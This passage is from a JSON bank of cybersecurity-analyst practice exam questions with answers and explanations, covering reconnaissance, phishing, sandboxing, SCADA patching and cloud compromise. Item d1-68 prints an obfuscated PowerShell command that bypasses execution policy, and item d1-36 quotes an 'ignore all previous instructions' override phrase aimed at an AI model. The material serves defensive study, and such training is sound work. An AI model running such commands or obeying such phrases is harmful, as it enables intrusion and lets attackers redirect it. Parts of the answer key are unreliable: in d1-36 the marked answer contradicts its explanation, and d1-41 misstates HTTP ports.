up.","Not all ports were scanned.","The scan scanned only UDP ports.","The scan was not run as root."],"a":2,"e":"This scan shows only UDP ports. Since most services run as TCP services, this scan wouldn’t have identified most common servers. Kwame should review the commands that his team issued as part of their exercise. If he finds that Nmap was run with an <code>-sU</code> flag, he will have found the issue.","l":"c5-portscan","l2":"","k":"UDP port scanning"},{"id":"d1-26","set":"d1","ch":3,"d":1,"q":"Hui is preparing a presentation on email security and is focusing on phishing emails. She notes that URL shorteners can be a risk. Which of the following descriptions should she use to describe the primary concern about URL shorteners as part of social engineering attacks?","o":["They allow typosquatting attacks.","They can disguise malicious links.","They prevent the use of DMARC.","They prevent the use of DKIM."],"a":1,"e":"Hui should note that URL shorteners can disguise malicious links. Typosquatting relies on mistyped URLs, not on URL shorteners. DKIM relies on digital signatures to validate email, and DMARC protects email domains from being falsified by validating sender identities.","l":"c3-cloud-social","l2":"c3-filesandbox","k":"URL shorteners phishing disguise"},{"id":"d1-27","set":"d1","ch":4,"d":1,"q":"Which sources are most commonly used to gather information about technologies a target organization uses during intelligence gathering?","o":["OSINT searches of support forums and social engineering","Port scanning and social engineering","Social media review and document metadata","Social engineering and document metadata"],"a":0,"e":"Since organizations often protect information about the technologies they use, OSINT searches of support forums and social engineering are often combined to gather information about the technologies they have in place. Port scanning will typically not provide detailed information about services and technologies. Social media review may provide some hints, but document metadata does not provide much information about specific technologies relevant to a penetration test or attack.","l":"c4-collect","l2":"","k":"OSINT intelligence gathering"},{"id":"d1-28","set":"d1","ch":5,"d":1,"q":"Sarah has been asked to assess the technical impact of suspected reconnaissance performed against her organization. She is informed that a reliable source has discovered that a third party has been performing reconnaissance by querying WHOIS data. How should Sarah categorize the technical impact of this type of reconnaissance?","o":["High","Medium","Low","She cannot determine this from the information given"],"a":2,"e":"Sarah knows that domain registration information is publicly available and that her organization controls the data that is published. Since this does not expose anything that she should not expect to be accessible, she should categorize this as a low impact.","l":"c5-recon","l2":"c4-collect","k":"WHOIS reconnaissance impact"},{"id":"d1-29","set":"d1","ch":5,"d":1,"q":"Rick is reviewing flows of a system on his network and discovers the following flow logs. What is the system doing?\n<pre>\n<code>ICMP \"Echo request\"</code>\n<code>Date flow start   Duration       Proto         Src IP Addr:Port-&gt;Dst IP Addr:Port   Packets   Bytes   Flows</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0-&gt;10.2.2.6:8.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.2.2.6:0-&gt;10.1.1.1:0.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0-&gt;10.2.2.7:8.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.2.2.7:0-&gt;10.1.1.1:0.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0-&gt;10.2.2.8:8.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.2.2.8:0-&gt;10.1.1.1:0.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0-&gt;10.2.2.9:8.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.2.2.9:0-&gt;10.1.1.1:0.0             11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0-&gt;10.2.2.10:8.0            11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.2.2.10:0-&gt;10.1.1.1:0.0            11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.1.1.1:0-&gt;10.2.2.6:11.0            11        924     1</code>\n<code>2019-07-11        04:58:59.518   10.000 ICMP   10.2.2.11:0-&gt;10.1.1.1:0.0            11        924     1</code>\n</pre>","o":["A port scan","A failed three-way handshake","A ping sweep","A traceroute"],"a":2,"e":"The increasing digit of the IP address of the target system (.6, .7, .8) and the ICMP protocol echo request indicate that this is a ping sweep. This could be part of a port scan, but the only behavior that is shown here is the ping sweep. This is ICMP and cannot be a three-way handshake, and a traceroute would follow a path rather than a series of IP addresses.","l":"c5-recon","l2":"c3-network","k":"ICMP ping sweep"},{"id":"d1-30","set":"d1","ch":3,"d":1,"q":"Ryan’s network management tools have identified a system that has been plugged into an Ethernet port that does not show up on his organization’s system inventory list. How should Ryan categorize this device until it has been found?","o":["As an APT","As a rogue device","As a guest device","As an edge device"],"a":1,"e":"Unwanted devices are considered rogue devices until they are identified and approved. Detecting rogue devices is an important part of network security management. Without more information about the behavior of the device it cannot be determined if it is being used for malicious purposes by an APT or other threat actor. Unknown devices are not considered guest devices, and there is no detail to determine if the device is an edge device.","l":"c3-network","l2":"c1-network","k":"rogue device detection"},{"id":"d1-31","set":"d1","ch":4,"d":1,"q":"Kevin is concerned that an employee of his organization might fall victim to a phishing attack and wants to redesign his social engineering awareness program. What type of threat is he most directly addressing?","o":["Nation-state","Hacktivist","Unintentional insider","Intentional insider"],"a":2,"e":"By conducting awareness training, Kevin is seeking to educate insiders about the risks posed by phishing attacks. Specifically, he is seeking to prevent an insider from unintentionally posing a risk to the organization by falling victim to a phishing attack.","l":"c4-classify","l2":"c3-cloud-social","k":"unintentional insider threat"},{"id":"d1-32","set":"d1","ch":4,"d":1,"q":"What purpose does a honeypot system serve as part of a cyber deception strategy when placed on a network as shown in the following diagram?\n<figure><img alt=\"Network diagram details cloud Internet, Border Router, switch, Honeypot, and Firewall to the cloud Internal Trusted Zone.\" loading=\"lazy\" src=\"img/pt/c01un003.png\"/></figure>","o":["It prevents attackers from targeting production servers.","It provides information about the techniques attackers are using.","It slows down attackers like sticky honey.","It provides real-time input to IDSs and IPSs."],"a":1,"e":"A honeypot is used by security researchers and practitioners to gather information about techniques and tools used by attackers. A honeypot will not prevent attackers from targeting other systems, and unlike a tarpit, it is not designed to slow down attackers. Typically, honeypot data must be analyzed to provide useful information that can be used to build IDS and IPS rules.","l":"c4-hunt","l2":"c1-network","k":"honeypot cyber deception"},{"id":"d1-33","set":"d1","ch":3,"d":1,"q":"Greg’s work email has been compromised and the malicious actors have begun sending out email purporting to be from him asking his staff to buy gift cards. How should the event that led to the attackers conducting this type of attack be categorized?","o":["Phishing","IAM account compromise","Social engineering","Business email compromise"],"a":3,"e":"Compromises of work email accounts that are then used to impersonate legitimate users to accomplish actions for malicious actors are considered business email compromise (BEC) attacks. Phishing may have been part of the path to compromising the attack, but the problem does not include enough information to know. The attack that occurred after the BEC event is a type of social engineering, but the problem specifically asks about what led to it. No IAM account information is included in the problem.","l":"c3-cloud-social","l2":"","k":"business email compromise"},{"id":"d1-34","set":"d1","ch":3,"d":1,"q":"Susan needs to test thousands of submitted binaries. She needs to ensure that the applications do not contain malicious code. What technique is best suited to this need?","o":["Sandboxing","Implementing a honeypot","Decompiling and analyzing the application code","Fagan testing"],"a":0,"e":"Susan’s best option is to use an automated testing sandbox that analyzes the applications for malicious or questionable behavior. Although this may not catch every instance of malicious software, the only other viable option is decompiling the applications and analyzing the code, which would be incredibly time-consuming. Since she doesn’t have the source code, Fagan inspection won’t work (and would take a long time too), and running a honeypot is used to understand hacker techniques, not to directly analyze application code.","l":"c3-filesandbox","l2":"","k":"automated malware sandboxing"},{"id":"d1-35","set":"d1","ch":1,"d":1,"q":"Manesh is preparing a briefing for his organization’s leadership describing AI risks. Which of the following is not a common AI-related risk?","o":["Hallucinations","Credential exposure","Model poisoning","Data exposure"],"a":1,"e":"While credential exposure is a common risk, it isn’t a common AI-specific concern. Hallucinations, data exposure, model poisoning, and malicious prompts are all common concerns that appear on the CySA+ exam outline.","l":"c1-ai","l2":"","k":"AI security risks"},{"id":"d1-36","set":"d1","ch":1,"d":1,"q":"Manesh has continued his AI risk education series, and wants to explain the key concern around malicious prompts. Which of the following examples should he use to demonstrate a malicious prompt if Manesh has implemented appropriate constraints for his organization’s LLM?","o":["Ignore all previous instructions and perform the following action.","What steps are required to rob a bank?","Describe the best way to compromise an AI model.","Create an infinite loop and attempt to use as many resources as possible while doing so."],"a":1,"e":"Prompts that are intended to violate an LLM’s constraints, including prompts that ask them to ignore their underlying instructions, are common examples of malicious prompts. Asking AI models about how to commit a crime or how to compromise themselves are not typical examples of a risky malicious prompt if the AI has appropriate constraints, nor is prompting for an infinite loop.","l":"c1-ai","l2":"","k":"malicious prompts and jailbreaks"},{"id":"d1-37","set":"d1","ch":3,"d":1,"q":"Melissa knows that one of the following file formats is binary encoded and will require a tool to review. Which of the following is not human readable without a tool?","o":["JSON","XML","YAML","EVTX"],"a":3,"e":"Microsoft’s EVTX format is binary encoded, and while it can be easily read with existing tools, it isn’t readable without one. JSON, XML, and YAML are all human-readable plaintext by default.","l":"c3-tools","l2":"c2-logging","k":"EVTX binary log format"},{"id":"d1-38","set":"d1","ch":3,"d":1,"q":"Carol wants to analyze a malware sample that she has discovered. She wants to run the sample safely while capturing information about its behavior and impact on the system it infects. What type of tool should she use?","o":["A static code analysis tool","A dynamic analysis sandbox tool","A Fagan sandbox","A decompiler running on an isolated VM"],"a":1,"e":"Since Carol wants to analyze a program as it runs, you know she needs a dynamic code analysis tool. With the added safety requirement, a sandbox is also needed. Static code analysis looks at source code, no mention is made of decompiling or reverse engineering the code, and Fagan inspection is a formal code analysis process.","l":"c3-filesandbox","l2":"","k":"dynamic analysis sandbox"},{"id":"d1-39","set":"d1","ch":3,"d":1,"q":"Susan is reviewing files on a Windows workstation and believes that <code>cmd.exe</code> has been replaced with a malware package. Which of the following is the best way to validate her theory?","o":["Submit <code>cmd.exe</code> to VirusTotal.","Compare the hash of <code>cmd.exe</code> to a known good version.","Check the file using the National Software Reference Library.","Run <code>cmd.exe</code> to make sure its behavior is normal."],"a":0,"e":"Susan’s best option is to submit the file to a tool like VirusTotal that will scan it for virus-like behaviors and known malware tools. Checking the hash either by using a manual check or by using the National Software Reference Library can tell her if the file matches a known good version but won’t tell her if it includes malware. Running a suspect file is the worst option on the list.","l":"c3-filesandbox","l2":"c3-host","k":"malicious file analysis VirusTotal"},{"id":"d1-40","set":"d1","ch":3,"d":1,"q":"Nicole wants to adopt an open source tool that will allow her to model user behavior to identify unwanted or unexpected behaviors, then forward that information to a SIEM. Which of the following tools is best suited to that need?","o":["EntityAnalyzer","UEBA.me","OpenUBA","OpenEDR"],"a":2,"e":"OpenUBA is an open source effort intended to provide user and entity behavior analysis tooling. The remaining options, EntityAnalzyer, UEBA.me, and OpenEDR, were all made up for this question.","l":"c3-uba-scripting","l2":"","k":"open source UEBA tools"},{"id":"d1-41","set":"d1","ch":3,"d":1,"q":"Bob is reviewing the following Snort rule that a co-worker wrote. He believes that it will not properly capture HTTPS traffic sent to a specific site. What change should he recommend to be more likely to capture HTTPS?\n<pre>\n<code>alert tcp anyany -&gt; any 80 (msg: \"Possible HTTPS GET request\"; </code>\n<code>content: \"GET\"; http_method; content: \"website_example.com\"; </code>\n<code>http_host; sid:1010101; rev:1;)?</code>\n</pre>","o":["Change to port 443.","Change the content to https://website_example.com.","Change the SID to 443.","Change the protocol to HTTPS."],"a":0,"e":"Bob knows that HTTP traffic is typically sent on TCP port 443 rather than port 80. While that’s not always the case, he would greatly increase the chances of Snort capturing the traffic he wants if he uses the right port. The content flag is looking for a URL, and HTTPS is not necessary there. SID is simply a numeric identifier for the rule, and this remains TCP traffic from a protocol perspective.","l":"c3-tools","l2":"","k":"Snort rule port configuration"},{"id":"d1-42","set":"d1","ch":3,"d":1,"q":"Geoff wants to analyze what a potentially malicious file does when executed so he can observe and document what occurs. What should he do?","o":["Run the file on a system disconnected from the Internet and review what happens in the logs.","Upload the file to a cloud service like AWS where he can safely run it in a third-party hosting environment.","Install and run a sandbox tool like Cuckoo Sandbox.","Upload the file to a tool like VirusTotal."],"a":2,"e":"Since Geoff wants to observe and document what happens, a tool that he controls like Cuckoo Sandbox is a better option than a third-party tool like VirusTotal. Running without specific instrumentation on a system disconnected from the network will not provide the same depth of visibility into what occurs, and running malware in the cloud without an appropriate environment isn’t safe or recommended!","l":"c3-filesandbox","l2":"","k":"malware sandboxing"},{"id":"d1-43","set":"d1","ch":2,"d":1,"q":"The company that Amanda works for is making significant investments in infrastructure-as-a-service hosting to replace their traditional datacenter. Members of her organization’s management have expressed concerns about data remanence when Amanda’s team moves from one virtual host to another in their cloud service provider’s environment. What should she instruct her team to do to avoid this concern?","o":["Perform zero-wipe drives before moving systems.","Use full-disk encryption.","Use data masking.","Span multiple virtual disks to fragment data."],"a":1,"e":"Amanda’s team should use full-disk encryption or volume encryption and should secure the encryption keys properly. This will ensure that any data that remains cannot be exposed to future users of the virtual infrastructure. Although many cloud providers have implemented technology to ensure that this won’t happen, Amanda can avoid any potential issues by ensuring that she has taken proactive action to prevent data exposure. Using a zero wipe is often impossible because virtual environments may move without her team’s intervention, data masking will not prevent unmasked data or temporary data stored on the virtual disks from being exposed, and spanning multiple virtual disks will still leave data accessible, albeit possibly in fragmented form.","l":"c2-crypto","l2":"c2-infra","k":"full-disk encryption data remanence"},{"id":"d1-44","set":"d1","ch":3,"d":1,"q":"Valerie checks AbuseIPDB because of a port scan run against her network. When she finds the IP in the AbuseIPDB list, she sees the following text. What should she record the event as?\n<figure><img alt=\"Screenshot lists I P address 71.6.233.236 with abuse statistics, network details, location, and whitelist note.\" loading=\"lazy\" src=\"img/pt/c01un004.png\"/></figure>","o":["A false positive","A trusted network","A port scan from a known source","An APT-driven attack"],"a":2,"e":"Valerie knows that Rapid7 is a well-known security vendor and the listing mentions Project Sonar, an effort that scans the entire Internet for services and protocols to determine global exposure of those services. The listing notes that services like these may still be of concern, but Valerie can be comfortable listing this as a port scan from a known source and can determine if she wants to block the traffic or let it pass. The scan is still a scan, so it’s not a false positive; the network is not known or trusted, and shouldn’t be; and there is no indication of an APT or any reason to suspect that this is not Rapid7 conducting scanning.","l":"c3-tip-edr","l2":"c5-portscan","k":"IP reputation and scanning sources"},{"id":"d1-45","set":"d1","ch":3,"d":1,"q":"Ian uses a GEO-IP lookup service to determine where a user is connecting from. Which of the following common practices might lead to the GEO-IP data not being accurate?","o":["The IP address may be a private address.","The user may be using a VPN service.","The user may be using Wi-Fi.","The user may be using a mobile device."],"a":1,"e":"VPN services are commonly used for location shifting, and many organizations’ VPNs will appear to originate from their main location or datacenter. If a remote user uses the VPN, their traffic will appear to be from the VPN’s IP range, regardless of their actual geographic location. Private IP addresses are not Internet routable and will not resolve via GEO-IP services. Wi-Fi still uses an IP address, so would resolve normally, and mobile devices will typically have an IP address associated with their provider and region.","l":"c3-tip-edr","l2":"c3-network","k":"GeoIP accuracy and VPNs"},{"id":"d1-46","set":"d1","ch":2,"d":1,"q":"Barbara has segmented her virtualized servers using VMware to ensure that the networks remain secure and isolated. What type of attack could defeat her security design?","o":["VLAN hopping","802.1q trunking vulnerabilities","Compromise of the underlying VMware host","BGP route spoofing"],"a":2,"e":"Barbara should be most concerned about compromise of the underlying VMware host as a threat model for her virtual segmentation. VLAN hopping (typically done via 802.1q trunking attacks) requires trunking to be turned on, which is unlikely in a virtualized environment like this. Border Gateway Protocol (BGP) route spoofing occurs at the router level and is once again unlikely to be a threat in a VMware environment.\n<p>You may not always know all the technologies in a question like this, so when you prepare for the exam, you should consider what you do know when you run into this type of question. Here, you might note that relying on the underlying host for virtualization means that a compromise of the system would allow attackers to overcome the segmentation that is acting to protect them.</p>","l":"c2-infra","l2":"c1-network","k":"hypervisor host compromise"},{"id":"d1-47","set":"d1","ch":6,"d":1,"q":"Chris has identified a critical vulnerability that includes the potential for remote code execution on PLCs that are part of his organization’s SCADA environment. When he talks to the plant operations manager, the manager asks that the patch be delayed. Why would the manager most likely ask for a delay?","o":["Patches may introduce new vulnerabilities.","Patching may lead to downtime.","The systems may not support the patch.","The patches may require that systems be re-inspected."],"a":1,"e":"Patching operational technology devices can lead to downtime as they reboot or as the patch is installed. If the plant manager requires continuous operation, Chris may need to wait until a maintenance window to install a patch. This means Chris may need to consider compensating controls. Patches introducing new vulnerabilities can happen, but a plant manager will typically not raise that concern. Patches meant for a specific PLC will typically take the resources like memory or storage available to the PLC into account, meaning they should be okay to install. The requirement to certify devices based on a software version is uncommon, so this is a far less likely scenario.","l":"c6-remediation","l2":"c7-web-ot","k":"SCADA patching downtime"},{"id":"d1-48","set":"d1","ch":6,"d":1,"q":"Chris wants to implement a compensating control for the patch that the plant manager asked him to delay. Which of the following is an appropriate compensating control that is likely already in place?","o":["Place the SCADA environment on a separate, protected network.","Implement host firewalls on the PLCs.","Enable IPS rules on the PLCs.","Disable networking on the PLCs."],"a":0,"e":"Many organizations keep their ICS and SCADA devices on separate protected networks because they know they’re difficult or even impossible to patch while also being critical to operations. That means they’re often on isolated networks with strong protections separating them from potential threats. PLCs typically don’t have the ability to run firewalls or an IPS, and disabling networking would mean losing control of the PLCs.","l":"c6-remediation","l2":"c7-web-ot","k":"SCADA compensating controls"},{"id":"d1-49","set":"d1","ch":3,"d":1,"q":"Angela wants to detect unauthorized configuration changes on Linux systems she manages. Which of the following options should she consider?","o":["Implementing shadow files","Deploying and configuring Operations Manager","Performing periodic manual validation","Using a file integrity monitor"],"a":3,"e":"Using a file integrity monitoring (FIM) tool will allow Angela to monitor configuration files for her Linux systems. Manual validation is slow and time consuming and won’t identify issues when they occur. Operations Manager is a Windows tool, and shadow files are used to protect passwords for Linux but not configuration files.","l":"c3-host","l2":"","k":"file integrity monitoring"},{"id":"d1-50","set":"d1","ch":3,"d":1,"q":"Which of the following is not a common way of identifying a rogue device on a network?","o":["Runing port scans","Checking MAC addresses on switches","Scanning for unexpected SSIDs","Walking through buildings"],"a":3,"e":"Network-level options like port scans, checking MAC addresses on switch ports, and scanning for unknown SSIDs all allow staff to identify rogue devices quickly and in an automated manner. Walking through buildings to determine if there are rogue devices is less efficient and thus less common unless a device has already been noticed via other means.","l":"c3-network","l2":"","k":"rogue device detection"},{"id":"d1-51","set":"d1","ch":3,"d":1,"q":"Marco’s monitoring software reports that his web server’s CPU load is at 100 percent and that the website hosted by the server is unavailable. When he reviews the server logs he finds an extremely high volume of identical queries sent to the server from thousands of IP addresses. What should he report his IoC as?","o":["A distributed port scan","A traffic spike","A potential distributed denial-of-service attack","A distributed vulnerability scan"],"a":2,"e":"The symptoms described best fit a distributed denial-of-service (DDoS) attack coming from a botnet or other large-scale attack service. Port scans would show traffic to a range of services, and vulnerability scans would typically show different requests as various vulnerabilities are tested. A traffic spike might have large numbers of log entries, but the same entry from many hosts is suspicious.","l":"c3-network","l2":"c3-host","k":"DDoS detection and indicators"},{"id":"d1-52","set":"d1","ch":3,"d":1,"q":"Jill is reviewing logs in her cloud environment and notices multiple IoCs:<ul class=\"square\">\n<li>New outbound traffic from her servers to IP addresses outside of her cloud environment</li>\n<li>100 percent average CPU load across all of the servers in the environment</li>\n<li>Attempts to spin up additional servers using an IAM account</li></ul>\n<p>What has most likely occurred?</p>","o":["Malicious actors have compromised a service account and are transferring organizational data to remote servers.","Malicious actors have compromised the IAM account and are mining cryptocurrency.","Malicious actors are conducting a CPU resource consumption denial-of-service attack.","A misconfiguration is leading to high CPU load, causing the devices to scale the load-balanced pool."],"a":1,"e":"High CPU load, outbound connections to unfamiliar systems outside of the environment, and an account attempting to spin up servers are all indicators that point to a likely cryptocurrency mining related compromise. Without the IAM account attempting to start new servers this could be a misconfiguration, but when taken together the cryptomining attack becomes the most likely scenario. The scenario does not describe bulk transfers of data associated with organization data theft at scale, and the CPU usage points to a concern there. A denial-of-service (DoS) attack could consume CPU cycles, but the IAM account concerns once again point to a compromise instead.","l":"c3-cloud-social","l2":"c3-host","k":"cryptojacking indicators in cloud"},{"id":"d1-53","set":"d1","ch":6,"d":1,"q":"Rick wants to add additional functionality to his browser to allow him to intercept and modify content on sites he is testing. Which of the following solutions best fits that need?","o":["An app","An API","A webhook","A plug-in"],"a":3,"e":"Plug-ins add additional functionality to tools like browsers, and a number of browser plug-ins provide this functionality. APIs and webhooks are used to allow applications to communicate, while a separate application doesn’t fit the need to allow Rick to directly add functionality to the browser.","l":"c6-tools","l2":"","k":"browser plug-in interception proxies"},{"id":"d1-54","set":"d1","ch":3,"d":1,"q":"Katie is analyzing her AWS security logs and sees the following events after seeing a login from an employee at a time and location they have never accessed the environment from before. What is most likely happening?\n<pre>\n<code>iam:ListUsers</code>\n<code>iam:ListAttachedUserPolicies</code>\n<code>iam:ListUserPolicies</code>\n<code>        </code>\n<code>iam:GetPolicyVersion</code>\n<code>ec2:DescribeInstances</code>\n<code>s3:ListBuckets</code>\n</pre>","o":["A legitimate user using a VPN that creates a false positive","An automated process doing cloud IAM maintenance","A malicious actor performing reconnaissance","A vulnerability scanner running in the environment"],"a":2,"e":"What Katie is likely seeing is reconnaissance inside of a compromised account. Legitimate users are unlikely to perform this list of actions in a row—tasks they’ll be trying to accomplish might use some of these, but the sequence is suspicious. While some of the items match IAM work, pivoting to EC2 and S3 is unlikely to be an IAM script or tool. A vulnerability scanner listing users and policies doesn’t match typical behavior either.\n<p>If you’re unfamiliar with specific commands like these, you can often find clues inside the question or answers. Here you can see that the API calls are <code>service:action</code>, so <code>iam:ListUsers</code> would list users and are intended to be human readable. Even if you don’t know the commands, you can likely narrow down possible answers!</p>","l":"c3-cloud-social","l2":"c4-hunt","k":"cloud IAM reconnaissance indicators"},{"id":"d1-55","set":"d1","ch":2,"d":1,"q":"What is the key difference between virtualization and containerization?","o":["Virtualization gives operating systems direct access to the hardware, whereas containerization does not allow applications to directly access the hardware.","Virtualization lets you run multiple operating systems on a single physical system, whereas containerization lets you run multiple applications on the same system.","Virtualization is necessary for containerization, but containerization is not necessary for virtualization.","There is not a key difference; they are elements of the same technology."],"a":1,"e":"Virtualization allows you to run multiple operating systems on the same underlying hardware, whereas containerization lets you deploy multiple applications on the same operating system on a single system. Containerization can allow direct hardware access, whereas virtualization typically does not. Virtualization is not necessary for containerization, although it is often used, but containerization can get performance improvements from bare-metal installations. Finally, there is a key difference, as noted in option B.","l":"c2-infra","l2":"","k":"virtualization vs containerization"},{"id":"d1-56","set":"d1","ch":2,"d":1,"q":"Brandon is designing the hosting environment for containerized applications. Application group A has personally identifiable information, application group B has health information with different legal requirements for handling, and application group C has business-sensitive data handling requirements. What is the most secure design for his container orchestration environment given the information he has?","o":["Run a single, highly secured container host with encryption for data at rest.","Run a container host for each application group and secure them based on the data they contain.","Run a container host for groups A and B, and run a lower-security container host for group C.","Run a container host for groups A and C, and run a health information–specific container host for group B due to the health information it contains."],"a":1,"e":"Workloads in a secure containerization environment should be distributed in a way that allows hosts to run containers of only a specific security level. Since Brandon has three different security levels in his environment, he should use separate hosts that can be configured to secure the data appropriately while also limiting the impact if a container is breached.","l":"c2-infra","l2":"c1-network","k":"container host isolation"},{"id":"d1-57","set":"d1","ch":2,"d":1,"q":"Local and domain administrator accounts, root accounts, and service accounts are all examples of what type of account?","o":["Monitored accounts","Privileged accounts","Root accounts","Unprivileged accounts"],"a":1,"e":"Privileged accounts typically include local and domain administrators, SA (system administrator in SQL), and other accounts that manage databases, root accounts, and other administrative accounts on Linux and Unix systems, service accounts, and similar accounts on network and other devices.","l":"c2-federation","l2":"","k":"privileged accounts"},{"id":"d1-58","set":"d1","ch":4,"d":1,"q":"The threat intelligence analysts at the company Nels works for have created a heat map that leverages the ATT&amp;CK framework, listing threat techniques on one axis and matching them to their rate of occurrence according to the organization’s logs and other security data on the other axis. Nels notes that phishing attacks are listed in red, and that SQL injection is listed in yellow. What does this tell Nels?","o":["Phishing is more prevalent than SQL injection.","ATT&amp;CK categorizes phishing as more of a threat than SQL injection.","SQL injection is more prevalent than phishing.","ATT&amp;CK categorizes SQL injection as more of a threat than phishing."],"a":0,"e":"Red on a heat map indicates an area of particular concern so Nels knows that phishing is a more commonly observed issue. ATT&amp;CK’s framework here is used to categorize threats, not to rate their heat rating.","l":"c4-classify","l2":"","k":"ATT&CK threat heat maps"},{"id":"d1-59","set":"d1","ch":2,"d":1,"q":"Facebook Connect, CAS, Shibboleth, and AD FS are all examples of what type of technology?","o":["Kerberos implementations","Single sign-on implementations","Federation technologies","OAuth providers"],"a":1,"e":"All of these are examples of single sign-on (SSO) implementations. They allow a user to use a single set of credentials to log in to multiple different services and applications. When federated, SSO can also allow a single account to work across a variety of services from multiple organizations.","l":"c2-iam","l2":"c2-federation","k":"single sign-on implementations"},{"id":"d1-60","set":"d1","ch":4,"d":1,"q":"Helen is reviewing a pulse in AlienVault OTX that she believes is relevant to her organization. The pulse includes an IP range, a number of individual IP addresses, and hashes of known malware. What validation step should she take based on this data if she believes it is trustworthy?","o":["Check the IP range to ensure that it is safe to block the entire range.","Check the hashes by obtaining the malware and hashing it herself.","Perform nslookups on the hashed data.","Block the IP addresses and validate that traffic stopped if it comes from them."],"a":1,"e":"It is particularly important to understand the impact that blocking an IP range may have. IP ranges belonging to service providers may be identified as part of a pulse, but Helen’s organization may rely on a service provider or a customer of a service provider in that range. That means she should understand what potential actions could mean. She should also check the individual IP addresses. Obtaining malware to hash it yourself is not a typical practice; you perform nsloookups on IP addresses, hostnames, or domains; and blocking traffic without validating the pulse data could cause issues.","l":"c4-collect","l2":"c3-tip-edr","k":"threat intelligence pulse validation"},{"id":"d1-61","set":"d1","ch":2,"d":1,"q":"Naomi wants to enforce her organization’s security policies on cloud service users. What technology is best suited to this?","o":["OAuth","CASB","OpenID","DMARC"],"a":1,"e":"A cloud access security broker (CASB) can perform actions such as monitoring activity, managing cloud security policies for SaaS services, enforcing security policies, logging, alerting, and in-line policy enforcement when deployed with agents on endpoint devices or as a proxy. OAuth is an authorization framework, OpenID is an authentication protocol, and DMARC is an email security protocol used to prevent phishing and spoofing.","l":"c2-netarch","l2":"c1-network","k":"Cloud Access Security Broker"},{"id":"d1-62","set":"d1","ch":4,"d":1,"q":"Elliott pays for a threat intelligence feed from a commercial vendor. What type of threat intelligence is this?","o":["Open source intelligence","Attributed intelligence","Closed source intelligence","Unattributed intelligence"],"a":2,"e":"Commercially available threat information like this that is sold and licensed is considered closed source threat intelligence. Open source threat intelligence is freely available. Attribution matches threat actors to actions they take.","l":"c4-collect","l2":"","k":"closed-source threat intelligence"},{"id":"d1-63","set":"d1","ch":9,"d":1,"q":"What is the key difference between a runbook and a playbook?","o":["Runbooks are used to run services; playbooks are used to document how services are set up.","Runbooks and playbooks are the same.","Runbooks are used for incident response teams; playbooks are used by operations teams.","A runbook is a step-by-step guide to perform a task, whereas a playbook is a higher-level strategic plan for response to a scenario."],"a":3,"e":"Runbooks are step-by-step guides to performing a task, whereas playbooks are strategic plans for response that define how an organization will respond rather than the specific details of what it will do. Playbooks and runbooks may be used by any team depending on what they’re written for.","l":"c9-foundation","l2":"c1-efficiency","k":"runbooks vs playbooks"},{"id":"d1-64","set":"d1","ch":4,"d":1,"q":"What term is used to describe defenses that obfuscate the attack surface of an organization by deploying decoys and attractive targets to slow down or distract an attacker?","o":["Cyber deception","A honeyjar","A bear trap","An interactive defense"],"a":0,"e":"Cyber deception is aimed at slowing down attackers while using their resources. The rest of the terms listed here were made up for this question. Cyber deception is often referred to as active defense.","l":"c4-hunt","l2":"c1-network","k":"cyber deception"},{"id":"d1-65","set":"d1","ch":4,"d":1,"q":"Tara has observed multiple users in her organization’s system administration team using the same credentials to manage servers. What should she identify this concern as if she’s using the STRIDE framework?","o":["Spoofing","Repudiation","Denial of service","Tampering"],"a":1,"e":"Since multiple users are using the same credentials, any action that one takes could have been undertaken by any of them. This creates a repudiation risk because actions cannot be attributed. No spoofing, denial of service, or tampering is described in the question.","l":"c4-classify","l2":"c8-managing","k":"STRIDE repudiation threat"},{"id":"d1-66","set":"d1","ch":4,"d":1,"q":"Anja wants to visualize her organization’s cyber risk profile. What process should she engage in to accomplish this task?","o":["OSINT","Threat mapping","STRIDE","The Pyramid of Pain"],"a":1,"e":"Threat mapping is used to visualize an organization’s threats by combining data about threats, attacks, and other information to provide a high-level view. OSINT is open source intelligence and may be used to gather information that will appear on a threat map. STRIDE is a threat modeling process and may also provide useful categorization for a threat map, but it doesn’t provide a data-driven visualization itself. The Pyramid of Pain documents how difficult removing tools from the grasp of attackers is, and does not provide organizational threat visualization.","l":"c4-classify","l2":"","k":"threat mapping"},{"id":"d1-67","set":"d1","ch":3,"d":1,"q":"What type of tool uses analytics to detect threats by comparing the behavior of users and devices like servers to baselines and norms?","o":["UEBA","SIEM","IPS","OTX"],"a":0,"e":"User and entity behavior analysis (UEBA) specifically looks at users and entities like servers and applications by modeling normal behavior baselines and identifying behavior outside the norms to find compromised accounts, insider threats, and APTs. SIEM and IPS devices may provide some of this functionality, but UEBA combines user and entity behavior in ways that SIEM and IPS often don’t. OTX, or the Open Threat Exchange, is a threat intelligence platform that may include IoCs but doesn’t perform this function.","l":"c3-uba-scripting","l2":"","k":"UEBA baseline behavioral analysis"},{"id":"d1-68","set":"d1","ch":3,"d":1,"q":"Amanda has discovered that the following command was run on a workstation after her EDR tool captured unusual behavior\n<pre>\n<code>powershell.exe -NoProfile -NonInteractive -Exec Bypass -e aGkhIHlvdSBmb3VuZCBhbiBlYXN0ZXIgZWdnIQ==</code>\n</pre>\n<p>What has she most likely discovered?</p>","o":["An automated process running from the Active Directory controller","An EDR false positive","A LOLBins style attack running obfuscated commands","A user attempting a privilege escalation attack"],"a":2,"e":"A PowerShell command running where it isn’t expected with flags set to avoid interactive windows and with the -e for encode flag set means that Amanda should suspect attackers living off the land using native tools. In many cases, that includes encoding commands in Base64 to obfuscate them from automated monitoring tools. There’s nothing in the command to point to an automated process, the EDR would be correct to flag unexpected behavior like this, and there’s no detail to suggest privilege escalation by a user but once she decodes the command she may have more knowledge.","l":"c3-host","l2":"c3-uba-scripting","k":"PowerShell LOLBins 